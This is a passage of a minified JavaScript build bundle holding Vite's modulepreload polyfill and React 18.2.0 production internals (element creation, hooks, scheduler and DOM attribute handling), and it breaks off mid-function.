(function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const l of document.querySelectorAll('link[rel="modulepreload"]')) r(l);
  new MutationObserver(l => {
      for (const o of l)
          if (o.type === "childList")
              for (const i of o.addedNodes) i.tagName === "LINK" && i.rel === "modulepreload" && r(i)
  }).observe(document, {
      childList: !0,
      subtree: !0
  });

  function n(l) {
      const o = {};
      return l.integrity && (o.integrity = l.integrity), l.referrerPolicy && (o.referrerPolicy = l.referrerPolicy), l.crossOrigin === "use-credentials" ? o.credentials = "include" : l.crossOrigin === "anonymous" ? o.credentials = "omit" : o.credentials = "same-origin", o
  }

  function r(l) {
      if (l.ep) return;
      l.ep = !0;
      const o = n(l);
      fetch(l.href, o)
  }
})();

function Js(e) {
  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var bs = {
      exports: {}
  },
  ol = {},
  eu = {
      exports: {}
  },
  M = {};
var bn = Symbol.for("react.element"),
  Sc = Symbol.for("react.portal"),
  Cc = Symbol.for("react.fragment"),
  _c = Symbol.for("react.strict_mode"),
  Nc = Symbol.for("react.profiler"),
  Ec = Symbol.for("react.provider"),
  Pc = Symbol.for("react.context"),
  zc = Symbol.for("react.forward_ref"),
  Mc = Symbol.for("react.suspense"),
  Lc = Symbol.for("react.memo"),
  Tc = Symbol.for("react.lazy"),
  Ui = Symbol.iterator;

function Rc(e) {
  return e === null || typeof e != "object" ? null : (e = Ui && e[Ui] || e["@@iterator"], typeof e == "function" ? e : null)
}
var tu = {
      isMounted: function () {
          return !1
      },
      enqueueForceUpdate: function () {},
      enqueueReplaceState: function () {},
      enqueueSetState: function () {}
  },
  nu = Object.assign,
  ru = {};

function an(e, t, n) {
  this.props = e, this.context = t, this.refs = ru, this.updater = n || tu
}
an.prototype.isReactComponent = {};
an.prototype.setState = function (e, t) {
  if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
  this.updater.enqueueSetState(this, e, t, "setState")
};
an.prototype.forceUpdate = function (e) {
  this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function lu() {}
lu.prototype = an.prototype;

function qo(e, t, n) {
  this.props = e, this.context = t, this.refs = ru, this.updater = n || tu
}
var Qo = qo.prototype = new lu;
Qo.constructor = qo;
nu(Qo, an.prototype);
Qo.isPureReactComponent = !0;
var Bi = Array.isArray,
  ou = Object.prototype.hasOwnProperty,
  Zo = {
      current: null
  },
  iu = {
      key: !0,
      ref: !0,
      __self: !0,
      __source: !0
  };

function su(e, t, n) {
  var r, l = {},
      o = null,
      i = null;
  if (t != null)
      for (r in t.ref !== void 0 && (i = t.ref), t.key !== void 0 && (o = "" + t.key), t) ou.call(t, r) && !iu.hasOwnProperty(r) && (l[r] = t[r]);
  var u = arguments.length - 2;
  if (u === 1) l.children = n;
  else if (1 < u) {
      for (var a = Array(u), d = 0; d < u; d++) a[d] = arguments[d + 2];
      l.children = a
  }
  if (e && e.defaultProps)
      for (r in u = e.defaultProps, u) l[r] === void 0 && (l[r] = u[r]);
  return {
      $$typeof: bn,
      type: e,
      key: o,
      ref: i,
      props: l,
      _owner: Zo.current
  }
}

function Ic(e, t) {
  return {
      $$typeof: bn,
      type: e.type,
      key: t,
      ref: e.ref,
      props: e.props,
      _owner: e._owner
  }
}

function Ko(e) {
  return typeof e == "object" && e !== null && e.$$typeof === bn
}

function Dc(e) {
  var t = {
      "=": "=0",
      ":": "=2"
  };
  return "$" + e.replace(/[=:]/g, function (n) {
      return t[n]
  })
}
var $i = /\/+/g;

function _l(e, t) {
  return typeof e == "object" && e !== null && e.key != null ? Dc("" + e.key) : t.toString(36)
}

function Sr(e, t, n, r, l) {
  var o = typeof e;
  (o === "undefined" || o === "boolean") && (e = null);
  var i = !1;
  if (e === null) i = !0;
  else switch (o) {
  case "string":
  case "number":
      i = !0;
      break;
  case "object":
      switch (e.$$typeof) {
      case bn:
      case Sc:
          i = !0
      }
  }
  if (i) return i = e, l = l(i), e = r === "" ? "." + _l(i, 0) : r, Bi(l) ? (n = "", e != null && (n = e.replace($i, "$&/") + "/"), Sr(l, t, n, "", function (d) {
      return d
  })) : l != null && (Ko(l) && (l = Ic(l, n + (!l.key || i && i.key === l.key ? "" : ("" + l.key).replace($i, "$&/") + "/") + e)), t.push(l)), 1;
  if (i = 0, r = r === "" ? "." : r + ":", Bi(e))
      for (var u = 0; u < e.length; u++) {
          o = e[u];
          var a = r + _l(o, u);
          i += Sr(o, t, n, a, l)
      } else if (a = Rc(e), typeof a == "function")
          for (e = a.call(e), u = 0; !(o = e.next()).done;) o = o.value, a = r + _l(o, u++), i += Sr(o, t, n, a, l);
      else if (o === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
  return i
}

function ir(e, t, n) {
  if (e == null) return e;
  var r = [],
      l = 0;
  return Sr(e, r, "", "", function (o) {
      return t.call(n, o, l++)
  }), r
}

function Ac(e) {
  if (e._status === -1) {
      var t = e._result;
      t = t(), t.then(function (n) {
          (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
      }, function (n) {
          (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
      }), e._status === -1 && (e._status = 0, e._result = t)
  }
  if (e._status === 1) return e._result.default;
  throw e._result
}
var ae = {
      current: null
  },
  Cr = {
      transition: null
  },
  Oc = {
      ReactCurrentDispatcher: ae,
      ReactCurrentBatchConfig: Cr,
      ReactCurrentOwner: Zo
  };
M.Children = {
  map: ir,
  forEach: function (e, t, n) {
      ir(e, function () {
          t.apply(this, arguments)
      }, n)
  },
  count: function (e) {
      var t = 0;
      return ir(e, function () {
          t++
      }), t
  },
  toArray: function (e) {
      return ir(e, function (t) {
          return t
      }) || []
  },
  only: function (e) {
      if (!Ko(e)) throw Error("React.Children.only expected to receive a single React element child.");
      return e
  }
};
M.Component = an;
M.Fragment = Cc;
M.Profiler = Nc;
M.PureComponent = qo;
M.StrictMode = _c;
M.Suspense = Mc;
M.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Oc;
M.cloneElement = function (e, t, n) {
  if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
  var r = nu({}, e.props),
      l = e.key,
      o = e.ref,
      i = e._owner;
  if (t != null) {
      if (t.ref !== void 0 && (o = t.ref, i = Zo.current), t.key !== void 0 && (l = "" + t.key), e.type && e.type.defaultProps) var u = e.type.defaultProps;
      for (a in t) ou.call(t, a) && !iu.hasOwnProperty(a) && (r[a] = t[a] === void 0 && u !== void 0 ? u[a] : t[a])
  }
  var a = arguments.length - 2;
  if (a === 1) r.children = n;
  else if (1 < a) {
      u = Array(a);
      for (var d = 0; d < a; d++) u[d] = arguments[d + 2];
      r.children = u
  }
  return {
      $$typeof: bn,
      type: e.type,
      key: l,
      ref: o,
      props: r,
      _owner: i
  }
};
M.createContext = function (e) {
  return e = {
      $$typeof: Pc,
      _currentValue: e,
      _currentValue2: e,
      _threadCount: 0,
      Provider: null,
      Consumer: null,
      _defaultValue: null,
      _globalName: null
  }, e.Provider = {
      $$typeof: Ec,
      _context: e
  }, e.Consumer = e
};
M.createElement = su;
M.createFactory = function (e) {
  var t = su.bind(null, e);
  return t.type = e, t
};
M.createRef = function () {
  return {
      current: null
  }
};
M.forwardRef = function (e) {
  return {
      $$typeof: zc,
      render: e
  }
};
M.isValidElement = Ko;
M.lazy = function (e) {
  return {
      $$typeof: Tc,
      _payload: {
          _status: -1,
          _result: e
      },
      _init: Ac
  }
};
M.memo = function (e, t) {
  return {
      $$typeof: Lc,
      type: e,
      compare: t === void 0 ? null : t
  }
};
M.startTransition = function (e) {
  var t = Cr.transition;
  Cr.transition = {};
  try {
      e()
  } finally {
      Cr.transition = t
  }
};
M.unstable_act = function () {
  throw Error("act(...) is not supported in production builds of React.")
};
M.useCallback = function (e, t) {
  return ae.current.useCallback(e, t)
};
M.useContext = function (e) {
  return ae.current.useContext(e)
};
M.useDebugValue = function () {};
M.useDeferredValue = function (e) {
  return ae.current.useDeferredValue(e)
};
M.useEffect = function (e, t) {
  return ae.current.useEffect(e, t)
};
M.useId = function () {
  return ae.current.useId()
};
M.useImperativeHandle = function (e, t, n) {
  return ae.current.useImperativeHandle(e, t, n)
};
M.useInsertionEffect = function (e, t) {
  return ae.current.useInsertionEffect(e, t)
};
M.useLayoutEffect = function (e, t) {
  return ae.current.useLayoutEffect(e, t)
};
M.useMemo = function (e, t) {
  return ae.current.useMemo(e, t)
};
M.useReducer = function (e, t, n) {
  return ae.current.useReducer(e, t, n)
};
M.useRef = function (e) {
  return ae.current.useRef(e)
};
M.useState = function (e) {
  return ae.current.useState(e)
};
M.useSyncExternalStore = function (e, t, n) {
  return ae.current.useSyncExternalStore(e, t, n)
};
M.useTransition = function () {
  return ae.current.useTransition()
};
M.version = "18.2.0";
eu.exports = M;
var T = eu.exports;
const uu = Js(T);
var Hc = T,
  Fc = Symbol.for("react.element"),
  Vc = Symbol.for("react.fragment"),
  Uc = Object.prototype.hasOwnProperty,
  Bc = Hc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
  $c = {
      key: !0,
      ref: !0,
      __self: !0,
      __source: !0
  };

function au(e, t, n) {
  var r, l = {},
      o = null,
      i = null;
  n !== void 0 && (o = "" + n), t.key !== void 0 && (o = "" + t.key), t.ref !== void 0 && (i = t.ref);
  for (r in t) Uc.call(t, r) && !$c.hasOwnProperty(r) && (l[r] = t[r]);
  if (e && e.defaultProps)
      for (r in t = e.defaultProps, t) l[r] === void 0 && (l[r] = t[r]);
  return {
      $$typeof: Fc,
      type: e,
      key: o,
      ref: i,
      props: l,
      _owner: Bc.current
  }
}
ol.Fragment = Vc;
ol.jsx = au;
ol.jsxs = au;
bs.exports = ol;
var s = bs.exports,
  Yl = {},
  cu = {
      exports: {}
  },
  we = {},
  du = {
      exports: {}
  },
  fu = {};
(function (e) {
  function t(C, P) {
      var z = C.length;
      C.push(P);
      e: for (; 0 < z;) {
          var Q = z - 1 >>> 1,
              Y = C[Q];
          if (0 < l(Y, P)) C[Q] = P, C[z] = Y, z = Q;
          else break e
      }
  }

  function n(C) {
      return C.length === 0 ? null : C[0]
  }

  function r(C) {
      if (C.length === 0) return null;
      var P = C[0],
          z = C.pop();
      if (z !== P) {
          C[0] = z;
          e: for (var Q = 0, Y = C.length, lr = Y >>> 1; Q < lr;) {
              var xt = 2 * (Q + 1) - 1,
                  Cl = C[xt],
                  wt = xt + 1,
                  or = C[wt];
              if (0 > l(Cl, z)) wt < Y && 0 > l(or, Cl) ? (C[Q] = or, C[wt] = z, Q = wt) : (C[Q] = Cl, C[xt] = z, Q = xt);
              else if (wt < Y && 0 > l(or, z)) C[Q] = or, C[wt] = z, Q = wt;
              else break e
          }
      }
      return P
  }

  function l(C, P) {
      var z = C.sortIndex - P.sortIndex;
      return z !== 0 ? z : C.id - P.id
  }
  if (typeof performance == "object" && typeof performance.now == "function") {
      var o = performance;
      e.unstable_now = function () {
          return o.now()
      }
  } else {
      var i = Date,
          u = i.now();
      e.unstable_now = function () {
          return i.now() - u
      }
  }
  var a = [],
      d = [],
      v = 1,
      m = null,
      h = 3,
      x = !1,
      w = !1,
      k = !1,
      D = typeof setTimeout == "function" ? setTimeout : null,
      f = typeof clearTimeout == "function" ? clearTimeout : null,
      c = typeof setImmediate < "u" ? setImmediate : null;
  typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

  function p(C) {
      for (var P = n(d); P !== null;) {
          if (P.callback === null) r(d);
          else if (P.startTime <= C) r(d), P.sortIndex = P.expirationTime, t(a, P);
          else break;
          P = n(d)
      }
  }

  function y(C) {
      if (k = !1, p(C), !w)
          if (n(a) !== null) w = !0, jl(S);
          else {
              var P = n(d);
              P !== null && Sl(y, P.startTime - C)
          }
  }

  function S(C, P) {
      w = !1, k && (k = !1, f(E), E = -1), x = !0;
      var z = h;
      try {
          for (p(P), m = n(a); m !== null && (!(m.expirationTime > P) || C && !Pe());) {
              var Q = m.callback;
              if (typeof Q == "function") {
                  m.callback = null, h = m.priorityLevel;
                  var Y = Q(m.expirationTime <= P);
                  P = e.unstable_now(), typeof Y == "function" ? m.callback = Y : m === n(a) && r(a), p(P)
              } else r(a);
              m = n(a)
          }
          if (m !== null) var lr = !0;
          else {
              var xt = n(d);
              xt !== null && Sl(y, xt.startTime - P), lr = !1
          }
          return lr
      } finally {
          m = null, h = z, x = !1
      }
  }
  var _ = !1,
      N = null,
      E = -1,
      q = 5,
      L = -1;

  function Pe() {
      return !(e.unstable_now() - L < q)
  }

  function fn() {
      if (N !== null) {
          var C = e.unstable_now();
          L = C;
          var P = !0;
          try {
              P = N(!0, C)
          } finally {
              P ? pn() : (_ = !1, N = null)
          }
      } else _ = !1
  }
  var pn;
  if (typeof c == "function") pn = function () {
      c(fn)
  };
  else if (typeof MessageChannel < "u") {
      var Vi = new MessageChannel,
          jc = Vi.port2;
      Vi.port1.onmessage = fn, pn = function () {
          jc.postMessage(null)
      }
  } else pn = function () {
      D(fn, 0)
  };

  function jl(C) {
      N = C, _ || (_ = !0, pn())
  }

  function Sl(C, P) {
      E = D(function () {
          C(e.unstable_now())
      }, P)
  }
  e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function (C) {
      C.callback = null
  }, e.unstable_continueExecution = function () {
      w || x || (w = !0, jl(S))
  }, e.unstable_forceFrameRate = function (C) {
      0 > C || 125 < C ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : q = 0 < C ? Math.floor(1e3 / C) : 5
  }, e.unstable_getCurrentPriorityLevel = function () {
      return h
  }, e.unstable_getFirstCallbackNode = function () {
      return n(a)
  }, e.unstable_next = function (C) {
      switch (h) {
      case 1:
      case 2:
      case 3:
          var P = 3;
          break;
      default:
          P = h
      }
      var z = h;
      h = P;
      try {
          return C()
      } finally {
          h = z
      }
  }, e.unstable_pauseExecution = function () {}, e.unstable_requestPaint = function () {}, e.unstable_runWithPriority = function (C, P) {
      switch (C) {
      case 1:
      case 2:
      case 3:
      case 4:
      case 5:
          break;
      default:
          C = 3
      }
      var z = h;
      h = C;
      try {
          return P()
      } finally {
          h = z
      }
  }, e.unstable_scheduleCallback = function (C, P, z) {
      var Q = e.unstable_now();
      switch (typeof z == "object" && z !== null ? (z = z.delay, z = typeof z == "number" && 0 < z ? Q + z : Q) : z = Q, C) {
      case 1:
          var Y = -1;
          break;
      case 2:
          Y = 250;
          break;
      case 5:
          Y = 1073741823;
          break;
      case 4:
          Y = 1e4;
          break;
      default:
          Y = 5e3
      }
      return Y = z + Y, C = {
          id: v++,
          callback: P,
          priorityLevel: C,
          startTime: z,
          expirationTime: Y,
          sortIndex: -1
      }, z > Q ? (C.sortIndex = z, t(d, C), n(a) === null && C === n(d) && (k ? (f(E), E = -1) : k = !0, Sl(y, z - Q))) : (C.sortIndex = Y, t(a, C), w || x || (w = !0, jl(S))), C
  }, e.unstable_shouldYield = Pe, e.unstable_wrapCallback = function (C) {
      var P = h;
      return function () {
          var z = h;
          h = P;
          try {
              return C.apply(this, arguments)
          } finally {
              h = z
          }
      }
  }
})(fu);
du.exports = fu;
var Wc = du.exports;
var pu = T,
  xe = Wc;

function g(e) {
  for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
  return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var hu = new Set,
  Dn = {};

function It(e, t) {
  tn(e, t), tn(e + "Capture", t)
}

function tn(e, t) {
  for (Dn[e] = t, e = 0; e < t.length; e++) hu.add(t[e])
}
var Qe = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
  Jl = Object.prototype.hasOwnProperty,
  qc = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
  Wi = {},
  qi = {};

function Qc(e) {
  return Jl.call(qi, e) ? !0 : Jl.call(Wi, e) ? !1 : qc.test(e) ? qi[e] = !0 : (Wi[e] = !0, !1)
}

function Zc(e, t, n, r) {
  if (n !== null && n.type === 0) return !1;
  switch (typeof t) {
  case "function":
  case "symbol":
      return !0;
  case "boolean":
      return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
  default:
      return !1
  }
}

function Kc(e, t, n, r) {
  if (t === null || typeof t > "u" || Zc(e, t, n, r)) return !0;
  if (r) return !1;
  if (n !== null) switch (n.type) {
  case 3:
      return !t;
  case 4:
      return t === !1;
  case 5:
      return isNaN(t);
  case 6:
      return isNaN(t) || 1 > t
  }
  return !1
}

function ce(e, t, n, r, l, o, i) {
  this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = l, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = o, this.removeEmptyString = i
}
var ne = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
  ne[e] = new ce(e, 0, !1, e, null, !1, !1)
});
[
  ["acceptCharset", "accept-charset"],
  ["className", "class"],
  ["htmlFor", "for"],
  ["httpEquiv", "http-equiv"]
].forEach(function (e) {
  var t = e[0];
  ne[t] = new ce(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
  ne[e] = new ce(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
  ne[e] = new ce(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
  ne[e] = new ce(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function (e) {
  ne[e] = new ce(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function (e) {
  ne[e] = new ce(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function (e) {
  ne[e] = new ce(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function (e) {
  ne[e] = new ce(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var Go = /[\-:]([a-z])/g;

function Xo(e) {
  return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
  var t = e.replace(Go, Xo);
  ne[t] = new ce(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
  var t = e.replace(Go, Xo);
  ne[t] = new ce(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
  var t = e.replace(Go, Xo);
  ne[t] = new ce(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function (e) {
  ne[e] = new ce(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
ne.xlinkHref = new ce("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function (e) {
  ne[e] = new ce(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function Yo(e, t, n, r) {
  var l = ne.hasOwnProperty(t) ? ne[t] : null;
  (l !== null ? l.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (Kc(t, n, l, r) && (n = null), r || l === null ? Qc(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : l.mustUseProperty ? e[l.propertyName] = n === null ? l.type === 3 ? !1 : "" : n : (t = l.attributeName, r = l.attributeNamespace, n === null ? e.removeAttribute(t) : (l = l.type, n = l === 3 || l === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var Xe = pu.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
  sr = Symbol.for("react.element"),
  Ot = Symbol.for("react.portal"),
  Ht = Symbol.for("react.fragment"),
  Jo = Symbol.for("react.strict_mode"),
  bl = Symbol.for("react.profiler"),
  mu = Symbol.for("react.provider"),
  vu = Symbol.for("react.context"),
  bo = Symbol.for("react.forward_ref"),
  eo = Symbol.for("react.suspense"),
  to = Symbol.for("react.suspense_list"),
  ei = Symbol.for("react.memo"),
  Je = Symbol.for("react.lazy"),
  yu = Symbol.for("react.offscreen"),
  Qi = Symbol.iterator;

function hn(e) {
  return e === null || typeof e != "object" ? null : (e = Qi && e[Qi] || e["@@iterator"], typeof e == "function" ? e : null)
}
var $ = Object.assign,
  Nl;

function jn(e) {
  if (Nl === void 0) try {
      throw Error()
  } catch (n) {
      var t = n.stack.trim().match(/\n( *(at )?)/);
      Nl = t && t[1] || ""
  }
  return `
` + Nl + e
}
var El = !1;

function Pl(e, t) {
  if (!e || El) return "";
  El = !0;
  var n = Error.prepareStackTrace;
  Error.prepareStackTrace = void 0;
  try {
      if (t)
          if (t = function () {
                  throw Error()
              }, Object.defineProperty(t.prototype, "props", {
                  set: function () {
                      throw Error()
                  }
              }), typeof Reflect == "object" && Reflect.construct) {
              try {
                  Reflect.construct(t, [])
              } catch (d) {
                  var r = d
              }
              Reflect.construct(e, [], t)
          } else {
              try {
                  t.call()
              } catch (d) {
                  r = d
              }
              e.call(t.prototype)
          }
      else {
          try {
              throw Error()
          } catch (d) {
              r = d
          }
          e()
      }
  } catch (d) {
      if (d && r && typeof d.stack == "string") {
          for (var l = d.stack.split(`
`), o = r.stack.split(`
`), i = l.length - 1, u = o.length - 1; 1 <= i && 0 <= u && l[i] !== o[u];) u--;
          for (; 1 <= i && 0 <= u; i--, u--)
              if (l[i] !== o[u]) {
                  if (i !== 1 || u !== 1)
                      do
                          if (i--, u--, 0 > u || l[i] !== o[u]) {
                              var a = `
` + l[i].replace(" at new ", " at ");
                              return e.displayName && a.includes("<anonymous>") && (a = a.replace("<anonymous>", e.displayName)), a
                          } while (1 <= i && 0 <= u);
                  break
              }
      }
  } finally {
      El = !1, Error.prepareStackTrace = n
  }
  return (e = e ? e.displayName || e.name : "") ? jn(e) : ""
}

function Gc(e) {
  switch (e.tag) {
  case 5:
      return jn(e.type);
  case 16:
      return jn("Lazy");
  case 13:
      return jn("Suspense");
  case 19:
      return jn("SuspenseList");
  case 0:
  case 2:
  case 15:
      return e = Pl(e.type, !1), e;
  case 11:
      return e = Pl(e.type.render, !1), e;
  case 1:
      return e = Pl(e.type, !0), e;
  default:
      return ""
  }
}

function no(e) {
  if (e == null) return null;
  if (typeof e == "function") return e.displayName || e.name || null;
  if (typeof e == "string") return e;
  switch (e) {
  case Ht:
      return "Fragment";
  case Ot:
      return "Portal";
  case bl:
      return "Profiler";
  case Jo:
      return "StrictMode";
  case eo:
      return "Suspense";
  case to:
      return "SuspenseList"
  }
  if (typeof e == "object") switch (e.$$typeof) {
  case vu:
      return (e.displayName || "Context") + ".Consumer";
  case mu:
      return (e._context.displayName || "Context") + ".Provider";
  case bo:
      var t = e.render;
      return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
  case ei:
      return t = e.displayName || null, t !== null ? t : no(e.type) || "Memo";
  case Je:
      t = e._payload, e = e._init;
      try {
          return no(e(t))
      } catch {}
  }
  return null
}

function Xc(e) {
  var t = e.type;
  switch (e.tag) {
  case 24:
      return "Cache";
  case 9:
      return (t.displayName || "Context") + ".Consumer";
  case 10:
      return (t._context.displayName || "Context") + ".Provider";
  case 18:
      return "DehydratedFragment";
  case 11:
      return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
  case 7:
      return "Fragment";
  case 5:
      return t;
  case 4:
      return "Portal";
  case 3:
      return "Root";
  case 6:
      return "Text";
  case 16:
      return no(t);
  case 8:
      return t === Jo ? "StrictMode" : "Mode";
  case 22:
      return "Offscreen";
  case 12:
      return "Profiler";
  case 21:
      return "Scope";
  case 13:
      return "Suspense";
  case 19:
      return "SuspenseList";
  case 25:
      return "TracingMarker";
  case 1:
  case 0:
  case 17:
  case 2:
  case 14:
  case 15:
      if (typeof t == "function") return t.displayName || t.name || null;
      if (typeof t == "string") return t
  }
  return null
}

function ht(e) {
  switch (typeof e) {
  case "boolean":
  case "number":
  case "string":
  case "undefined":
      return e;
  case "object":
      return e;
  default:
      return ""
  }
}

function gu(e) {
  var t = e.type;
  return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function Yc(e) {
  var t = gu(e) ? "checked" : "value",
      n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
      r = "" + e[t];
  if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
      var l = n.get,
          o = n.set;
      return Object.defineProperty(e, t, {
          configurable: !0,
          get: function () {
              return l.call(this)
          },
          set: function (i) {
              r = "" + i, o.call(this, i)
          }
      }), Object.defineProperty(e, t, {
          enumerable: n.enumerable
      }), {
          getValue: function () {
              return r
          },
          setValue: function (i) {
              r = "" + i
          },
          stopTracking: function () {
              e._valueTracker = null, delete e[t]
          }
      }
  }
}

function ur(e) {
  e._valueTracker || (e._valueTracker = Yc(e))
}

function xu(e) {
  if (!e) return !1;
  var t = e._valueTracker;
  if (!t) return !0;
  var n = t.getValue(),
      r = "";
  return e && (r = gu(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function Dr(e) {
  if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
  try {
      return e.activeElement || e.body
  } catch {
      return e.body
  }
}

function ro(e, t) {
  var n = t.checked;
  return $({}, t, {
      defaultChecked: void 0,
      defaultValue: void 0,
      value: void 0,
      checked: n ?? e._wrapperState.initialChecked
  })
}

function Zi(e, t) {
  var n = t.defaultValue == null ? "" : t.defaultValue,
      r = t.checked != null ? t.checked : t.defaultChecked;
  n = ht(t.value != null ? t.value : n), e._wrapperState = {
      initialChecked: r,
      initialValue: n,
      controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
  }
}

function wu(e, t) {
  t = t.checked, t != null && Yo(e, "checked", t, !1)
}

function lo(e, t) {
  wu(e, t);
  var n = ht(t.value),
      r = t.type;
  if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
  else if (r === "submit" || r === "reset") {
      e.removeAttribute("value");
      return
  }
  t.hasOwnProperty("value") ? oo(e, t.type, n) : t.hasOwnProperty("defaultValue") && oo(e, t.type, ht(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}

function Ki(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
      var r = t.type;
      if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
      t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
  }
  n = e.name, n !== "" && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, n !== "" && (e.name = n)
}

function oo(e, t, n) {
  (t !== "number" || Dr(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var Sn = Array.isArray;

function Gt(e, t, n, r) {
  if (e = e.options, t) {
      t = {};
      for (var l = 0; l < n.length; l++) t["$" + n[l]] = !0;
      for (n = 0; n < e.length; n++) l = t.hasOwnProperty("$" + e[n].value), e[n].selected !== l && (e[n].selected = l), l && r && (e[n].defaultSelected = !0)
  } else {
